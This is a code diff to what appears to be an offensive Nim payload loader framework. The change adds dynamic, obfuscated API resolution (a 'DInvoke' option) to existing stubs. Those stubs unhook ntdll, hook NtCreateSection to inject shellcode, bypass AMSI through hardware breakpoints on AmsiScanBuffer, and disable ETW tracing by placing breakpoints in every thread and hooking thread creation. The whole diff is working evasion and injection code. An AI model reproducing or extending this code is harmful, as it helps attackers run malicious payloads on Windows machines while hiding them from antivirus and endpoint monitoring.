@@ -63,7 +63,7 @@ let UnhookNtdllStub * = """
                         return false
                     status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
                     if status != 0:
-                        when defined(verbose):GetProcAddress
+                        when defined(verbose):
                             echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
                         return false
                     status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
@@ -167,7 +167,10 @@ proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =
         dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
     
     when defined(GetSyscallStub):
-        let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        when defined(DInvoke):
+            let syscallStub_NtAlloc = MyVirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+        else:
+            let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
         var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
         var oldProtection: DWORD = 0
         var success: BOOL
@@ -339,8 +342,11 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
     else:
         when defined(verbose):
             echo obf("[+] Loaded ntdll.dll")
-
-    var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
+    
+    when defined(DInvoke):
+        var NtFlushInstructionCacheAddress = MyGetProcAddress(ntdlldll, obf("NtFlushInstructionCache"))
+    else:
+        var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
     if isNil(NtFlushInstructionCacheAddress):
         when defined(verbose):
             echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
@@ -364,8 +370,10 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
         var buffers: HookTrampolineBuffers
         buffers.originalBytes = cast[HANDLE](addr g_hookedNtCreate.ntCreateStub[0])
         buffers.originalBytesSize = DWORD(sizeof(g_hookedNtCreate.ntCreateStub))
-        
-        var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
+        when defined(DInvoke):
+            var addressToHook: LPVOID = cast[LPVOID](MyGetProcAddress(MyGetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
+        else:
+            var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
         var trampolinesuccess: bool = fastTrampoline(false, cast[LPVOID](ntCreate_Address), nil, &buffers)
         if (trampolinesuccess == false):
             when defined(verbose):
@@ -505,7 +513,10 @@ proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG,
         VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
         return output
     proc hookntCreateSection(): bool =
-        var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
+        when defined(DInvoke):
+            var addressToHook: LPVOID = cast[LPVOID](MyGetProcAddress(MyGetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
+        else:
+            var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
         ntCreate_Address = cast[HANDLE](addressToHook)
         when defined(verbose):
             echo obf("NtCreateSection Address: "), repr(addressToHook)
@@ -853,7 +864,10 @@ let AmsiStub * = """
 
         # Load amsi.dll if it hasn't be loaded alreay.
         if g_amsiScanBufferPtr == nil:
-            var amsi = GetModuleHandleA(obf("amsi.dll"))
+            when defined(DInvoke):
+                var amsi = MyGetModuleHandleA(obf("amsi.dll"))
+            else:
+                var amsi = GetModuleHandleA(obf("amsi.dll"))
             
             var ModuleFileName: UNICODE_STRING
             when defined(DInvoke):
@@ -875,7 +889,10 @@ let AmsiStub * = """
                     echo obf("[+] Loaded: amsi.dll")
 
             if amsi != 0:
-                g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("AmsiScanBuffer")))
+                when defined(DInvoke):
+                    g_amsiScanBufferPtr = cast[PVOID](MyGetProcAddress(amsi, obf("AmsiScanBuffer")))
+                else:
+                    g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("AmsiScanBuffer")))
 
             if g_amsiScanBufferPtr == nil:
                 when defined(verbose):
@@ -884,12 +901,20 @@ let AmsiStub * = """
                 #quit(1)
 
         # add our vectored exception handle
-        let hExHandler = AddVectoredExceptionHandler(1, AMSIExceptionHandler)
+        when defined(DInvoke):
+            let hExHandler = MyRtlAddVectoredExceptionHandler(1, AMSIExceptionHandler)
+        else:
+            let hExHandler = RtlAddVectoredExceptionHandler(1, AMSIExceptionHandler)
 
         # Set a hardware breakpoint on AmsiScanBuffer function
-        if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
-            enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0)
-            SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
+        when defined(DInvoke):
+            if MyGetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+                enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0)
+                discard MySetThreadContext(cast[HANDLE](-2), threadCtx.addr)
+        else:
+            if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+                enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0)
+                SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
 
         return cast[HANDLE](hExHandler)
 
@@ -953,24 +978,7 @@ let AMSIPatchStub * = """
         var 
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
-        #[
-        when defined(GetSyscallStub):
-            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
-            # Define NtProtectVirtualMemory
-            var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-            when defined(DInvoke):
-                success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-            else:
-                success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-            # define NtWriteVirtualMemory
-            let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-            when defined(DInvoke):
-                success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-            else:
-                success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-            success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
-            success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
-        ]#  
+        
         when defined(SysWhispers):
             status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                     
@@ -1099,23 +1107,43 @@ when defined(HardwareETW):
         OldBaseThreadInitThunk = proc(LdrReserved: DWORD, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID): void {.stdcall.}
 
     var Kernel32ThreadInitThunkFunction: ULONG_PTR
-    var fn = cast[ULONG_PTR](GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("BaseThreadInitThunk")))
+    when defined(DInvoke):
+        var fn = cast[ULONG_PTR](MyGetProcAddress(MyGetModuleHandleA(obf("kernel32")), obf("BaseThreadInitThunk")))
+    else:
+        var fn = cast[ULONG_PTR](GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("BaseThreadInitThunk")))
 
     # This is our hook function, which will set the Breakpoint for a new Thread and afterwards call the original function
     proc BaseThreadInitThunk(LdrReserved: DWORD, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID): void =
       when defined(verbose):
         echo obf("[*] New Thread created and catched via Hook...")
-        echo obf("[*] Thread ID: "), GetCurrentThreadId()
+        when defined(DInvoke):
+            echo obf("[*] Thread ID: "), MyGetCurrentThreadId()
+        else:
+            echo obf("[*] Thread ID: "), GetCurrentThreadId()
 
       # Actually set the Breakpoint for the current Thread
       var threadCtx: CONTEXT
       threadCtx.ContextFlags = CONTEXT_ALL
-      if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+
+      when defined(DInvoke):
+        if MyGetThreadContext(cast[HANDLE](-2), threadCtx.addr):
           enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
-          SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
+          discard MySetThreadContext(cast[HANDLE](-2), threadCtx.addr)
           when defined(verbose):
+            when defined(DInvoke):
+                echo obf("Breakpoint set for Thread ID: "), MyGetCurrentThreadId()
+            else:
               echo obf("Breakpoint set for Thread ID: "), GetCurrentThreadId()
-      # Restore the old function
+      else:
+        if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
+            enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
+            SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
+            when defined(verbose):
+                when defined(DInvoke):
+                    echo obf("Breakpoint set for Thread ID: "), MyGetCurrentThreadId()
+                else:
+                    echo obf("Breakpoint set for Thread ID: "), GetCurrentThreadId()
+        # Restore the old function
       discard InterlockedCompareExchangePointer(cast[ptr PVOID](Kernel32ThreadInitThunkFunction), cast[PVOID](fn), cast[PVOID](BaseThreadInitThunk))
       # Cast it to the old function type and call it afterwards with the original parameters
       var oldBaseThreadInitThunk: OldBaseThreadInitThunk = cast[OldBaseThreadInitThunk](fn)
@@ -1126,7 +1154,10 @@ when defined(HardwareETW):
 let ETWStub * = """
 
     proc hookBaseThreadInitThunk(): void =
-      var m = GetModuleHandleA(obf("ntdll"))
+      when defined(DInvoke):
+        var m = MyGetModuleHandleA(obf("ntdll"))
+      else:
+        var m = GetModuleHandleA(obf("ntdll"))
       var nt = cast[PIMAGE_NT_HEADERS](m + cast[PIMAGE_DOS_HEADER](m).e_lfanew)
       var sh = IMAGE_FIRST_SECTION(nt)
 
@@ -1158,7 +1189,10 @@ let ETWStub * = """
     proc SetupETWBreakpoints(): void =
         # Load ntdll.dll if it hasn't be loaded alreay.
         if g_ntTraceEventBufferPtr == nil:
-            var ntdll = GetModuleHandleA(obf("ntdll.dll"))
+            when defined(DInvoke):
+                var ntdll = MyGetModuleHandleA(obf("ntdll.dll"))
+            else:
+                var ntdll = GetModuleHandleA(obf("ntdll.dll"))
             
             if(ntdll == 0):
                 var ModuleFileName: UNICODE_STRING
@@ -1180,16 +1214,25 @@ let ETWStub * = """
                         echo obf("[+] Loaded: ntdll.dll")
             
             if ntdll != 0:
-                g_ntTraceEventBufferPtr = cast[PVOID](GetProcAddress(ntdll, obf("NtTraceEvent")))
+                when defined(DInvoke):
+                    g_ntTraceEventBufferPtr = cast[PVOID](MyGetProcAddress(ntdll, obf("NtTraceEvent")))
+                else:
+                    g_ntTraceEventBufferPtr = cast[PVOID](GetProcAddress(ntdll, obf("NtTraceEvent")))
             if g_ntTraceEventBufferPtr == nil:
                 when defined(verbose):
                     echo obf("[-] Failed to Load NtTraceEvent")
                 #return 0
                 #quit(1)
         # add our vectored exception handle
-        let hExHandler = AddVectoredExceptionHandler(1, ETWExceptionHandler)
+        when defined(DInvoke):
+            let hExHandler = MyRtlAddVectoredExceptionHandler(1, ETWExceptionHandler)
+        else:
+            let hExHandler = RtlAddVectoredExceptionHandler(1, ETWExceptionHandler)
         when defined(verbose):
-            echo obf("[*] Monitoring Threads for ") & $GetCurrentProcessId()
+            when defined(DInvoke):
+                echo obf("[*] Monitoring Threads for ") & $MyGetCurrentProcessId()
+            else:
+                echo obf("[*] Monitoring Threads for ") & $GetCurrentProcessId()
         
         # assuming, we will not have more than 50 Threads, we'll create 50 context structures for each thread.
         var threadCtx: array[50, CONTEXT]
@@ -1212,35 +1255,60 @@ let ETWStub * = """
                 echo obf("[-] Failed to get first thread")
             return
         while Thread32Next(hThreadSnap, addr te32) != 0:
-            if te32.th32OwnerProcessID == GetCurrentProcessId():
-                threads[threadCount] = te32.th32ThreadID
-                inc threadCount
-        
-        CloseHandle(hThreadSnap)
+            when defined(DInvoke):
+                if te32.th32OwnerProcessID == MyGetCurrentProcessId():
+                    threads[threadCount] = te32.th32ThreadID
+                    inc threadCount
+            else:
+                if te32.th32OwnerProcessID == GetCurrentProcessId():
+                    threads[threadCount] = te32.th32ThreadID
+                    inc threadCount
+        when defined(DInvoke):
+            discard MyCloseHandle(hThreadSnap)
+        else:
+            CloseHandle(hThreadSnap)
         # Now we have a list of all the threads in the current process, we can iterate through them and attach a hardware breakpoint to them.
         for i in 0 ..< threadCount:
-            var hThread = OpenThread(THREAD_ALL_ACCESS, false, threads[i])
+            when defined(DInvoke):
+                var hThread = MyOpenThread(THREAD_ALL_ACCESS, false, threads[i])
+            else:
+                var hThread = OpenThread(THREAD_ALL_ACCESS, false, threads[i])
             if hThread == 0:
                 when defined(verbose):
                     echo obf("[-] Failed to open thread")
                 return
             #var context: CONTEXT
             #context.ContextFlags = CONTEXT_ALL
-            if GetThreadContext(hThread, threadCtx[i].addr) == 0:
-                when defined(verbose):
-                    echo obf("[-] Failed to get thread context")
-                return
+            when defined(DInvoke):
+                if MyGetThreadContext(hThread, threadCtx[i].addr) == 0:
+                    when defined(verbose):
+                        echo obf("[-] Failed to get thread context")
+                    return
+            else:
+                if GetThreadContext(hThread, threadCtx[i].addr) == 0:
+                    when defined(verbose):
+                        echo obf("[-] Failed to get thread context")
+                    return
             # Check if the thread already has a hardware breakpoint set
             if (threadCtx[i].Dr7 == 0) or (threadCtx[i].DR7 == DWORD64(0x0000000000000401)#[AMSI Hardware Breakpoint for Main Thread]#):
                 # Set the hardware breakpoint
                 enableBreakPoint(threadCtx[i], g_ntTraceEventBufferPtr, 1)
-                if SetThreadContext(hThread, addr threadCtx[i]) == 0:
-                    when defined(verbose):
-                        echo obf("[-] Failed to set thread context")
-                    return
+                when defined(DInvoke):
+                    if MySetThreadContext(hThread, addr threadCtx[i]) == 0:
+                        when defined(verbose):
+                            echo obf("[-] Failed to set thread context")
+                        return
+                else:
+                    if SetThreadContext(hThread, addr threadCtx[i]) == 0:
+                        when defined(verbose):
+                            echo obf("[-] Failed to set thread context")
+                        return
                 when defined(verbose):
                     echo obf("[+] Attached Hardware Breakpoint to Thread: ") & $threads[i]
-            CloseHandle(hThread)
+            when defined(DInvoke):
+                discard MyCloseHandle(hThread)
+            else:
+                CloseHandle(hThread)
         # After setting the Breakpoint for all current Threads, we will also set a hook on BaseThreadInitThunk to also set Breakpoints for new threads.
         hookBaseThreadInitThunk()
     
@@ -1252,7 +1320,10 @@ let ETWStub * = """
       var rand = mscor.new(obf("System.Random"))
       echo rand.Next()
     Decoy()
-    Sleep(1500)
+    when defined(DInvoke):
+        discard MySleep(1500)
+    else:
+        Sleep(1500)
     SetupETWBreakpoints()
 
 """
@@ -1523,20 +1594,17 @@ type
   CreateFileW_t* = proc (lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
   SetFileInformationByHandle_t* = proc (hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.stdcall.}
   GetModuleFileNameW_t* = proc (hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.stdcall.}
-  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
   PathFileExistsW_t* = proc (pszPath: LPCWSTR): WINBOOL {.stdcall.}
 
 const
   CreateFileW_HASH * = obf("CreateFileW")
   SetFileInformationByHandle_HASH * = obf("SetFileInformationByHandle")
   GetModuleFileNameW_HASH * = obf("GetModuleFileNameW")
-  CloseHandle_HASH * = obf("CloseHandle")
   PathFileExistsW_HASH * = obf("PathFileExistsW")
 
 var MyCreateFileW*: CreateFileW_t
 var MySetFileInformationByHandle*: SetFileInformationByHandle_t
 var MyGetModuleFileNameW*: GetModuleFileNameW_t
-var MyCloseHandle*: CloseHandle_t
 var MyPathFileExistsW*: PathFileExistsW_t
 
 
@@ -1577,7 +1645,6 @@ MySetFileInformationByHandle = cast[SetFileInformationByHandle_t](cast[LPVOID](g
 
 MyGetModuleFileNameW = cast[GetModuleFileNameW_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleFileNameW_HASH, 0, FALSE))
 
-MyCloseHandle = cast[CloseHandle_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE))
 
 # Works but potentially the ordinal could change later on - this lead to bugs
 #MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), "", 669, FALSE))
